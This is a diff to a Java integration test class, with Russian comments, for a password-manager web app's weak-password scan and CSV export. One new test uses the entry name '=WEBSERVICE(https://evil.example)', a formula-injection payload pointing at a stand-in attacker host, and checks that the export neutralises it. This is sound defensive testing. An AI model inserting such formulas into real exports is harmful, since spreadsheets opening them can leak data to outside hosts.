@@ -1089,15 +1089,81 @@ class WebUiIT {
         registerUser("webscan-noscan");
         MockHttpSessionHolder holder = login("webscan-noscan");
 
+        // Фикс flash: redirect СРАЗУ на /web/entries — промежуточный GET
+        // страницы отчёта без flash сам редиректит дальше и съедает FlashMap.
         mockMvc.perform(get("/web/entries/scan/report/export").session(holder.session()))
                 .andExpect(status().is3xxRedirection())
-                .andExpect(redirectedUrl("/web/entries/scan/report"))
+                .andExpect(redirectedUrl("/web/entries"))
                 .andExpect(flash().attribute("flashError", "Сначала запустите скан"));
 
         // Страница отчёта без flash — на список записей (PRG-контракт)
         mockMvc.perform(get("/web/entries/scan/report").session(holder.session()))
                 .andExpect(status().is3xxRedirection())
                 .andExpect(redirectedUrl("/web/entries"));
+    }
+
+    /** G2 (Фаза 4): rescan обновляет кэш — экспорт после повторного скана
+     * отражает новое состояние (исправленный пароль уже не слабый). */
+    @Test
+    void rescanUpdatesCachedScanForExport() throws Exception {
+        registerUser("webscan-cache");
+        MockHttpSessionHolder holder = login("webscan-cache");
+        createEntry(holder, "Кэш-запись", "https://example.com", "alice", "123456");
+
+        mockMvc.perform(post("/web/entries/scan").session(holder.session()).with(csrf()))
+                .andExpect(status().is3xxRedirection());
+        mockMvc.perform(get("/web/entries/scan/report/export").session(holder.session()))
+                .andExpect(status().isOk())
+                .andExpect(content().string(
+                        org.hamcrest.Matchers.containsString("# weak,1")));
+
+        // Исправляем пароль → повторный скан → кэш обязан обновиться
+        rateLimiter.reset();
+        String entryId = firstEntryId(holder);
+        mockMvc.perform(post("/web/entries/" + entryId + "/edit")
+                        .session(holder.session())
+                        .with(csrf())
+                        .param("name", "Кэш-запись")
+                        .param("site", "https://example.com")
+                        .param("login", "alice")
+                        .param("password", "Zk9#mQ2$vL8!wR4&xJ6%")
+                        .param("notes", ""))
+                .andExpect(status().is3xxRedirection());
+        mockMvc.perform(post("/web/entries/scan").session(holder.session()).with(csrf()))
+                .andExpect(status().is3xxRedirection());
+
+        MvcResult export = mockMvc.perform(get("/web/entries/scan/report/export")
+                        .session(holder.session()))
+                .andExpect(status().isOk())
+                .andReturn();
+        String csv = export.getResponse().getContentAsString(
+                java.nio.charset.StandardCharsets.UTF_8);
+        assertThat(csv).contains("# weak,0")
+                .doesNotContain("Кэш-запись");
+    }
+
+    /** G2 (Фаза 4): formula-injection гвард в реальном экспорте — имя записи
+     * «=WEBSERVICE(...)» попадает в CSV с префиксом апострофа. */
+    @Test
+    void scanReportExportGuardsFormulaInjection() throws Exception {
+        registerUser("webscan-formula");
+        MockHttpSessionHolder holder = login("webscan-formula");
+        createEntry(holder, "=WEBSERVICE(https://evil.example)",
+                "https://example.com", "alice", "123456");
+
+        mockMvc.perform(post("/web/entries/scan").session(holder.session()).with(csrf()))
+                .andExpect(status().is3xxRedirection());
+
+        MvcResult export = mockMvc.perform(get("/web/entries/scan/report/export")
+                        .session(holder.session()))
+                .andExpect(status().isOk())
+                .andReturn();
+        String csv = export.getResponse().getContentAsString(
+                java.nio.charset.StandardCharsets.UTF_8);
+        assertThat(csv).contains("'=WEBSERVICE(https://evil.example)");
+        // «голого» =WEBSERVICE в файле нет (вырезаем прикрытое вхождение)
+        assertThat(csv.replace("'=WEBSERVICE", ""))
+                .doesNotContain("=WEBSERVICE");
     }
 
     /** Повторный скан после смены пароля на сильный — тег снят (untagged). */
